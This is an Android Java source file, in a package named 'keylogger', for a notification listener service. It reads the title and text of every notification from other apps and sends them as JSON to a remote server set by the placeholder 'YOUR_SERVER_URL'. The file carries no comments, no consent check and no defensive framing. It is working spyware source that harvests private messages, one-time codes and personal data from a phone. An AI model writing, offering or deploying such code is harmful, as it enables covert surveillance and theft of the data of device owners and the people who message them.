package com.example.keylogger;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class NotificationLogger extends NotificationListenerService {

    private static final String SERVER_URL = "YOUR_SERVER_URL";
    private static final String TAG = "NotificationLogger";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);

        String packageName = sbn.getPackageName();
        
        if (packageName.equals("android") || packageName.equals(getPackageName())) {
            return;
        }

        Notification notification = sbn.getNotification();
        if (notification == null) {
            return;
        }

        Bundle extras = notification.extras;
        String title = extras.getString(Notification.EXTRA_TITLE);
        String text = extras.getString(Notification.EXTRA_TEXT);

        if (title != null && text != null) {
            Log.d(TAG, "Notification Captured: " + packageName + " | " + title + ": " + text);
           
            logNotification(packageName, title, text);
        }
    }

    private void logNotification(String packageName, String title, String text) {
        JSONObject logPayload = new JSONObject();
        try {
            logPayload.put("timestamp", System.currentTimeMillis());
            logPayload.put("app", packageName); 
            logPayload.put("type", "notification");
            
            JSONObject data = new JSONObject();
            data.put("title", title);
            data.put("text", text);
            
            logPayload.put("data", data);
            
            sendToServer(logPayload.toString());

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendToServer(String jsonPayload) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");

                OutputStream os = conn.getOutputStream();
                os.write(jsonPayload.getBytes("UTF-8"));
                os.flush();
                os.close();
                conn.getResponseCode(); // Send request
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
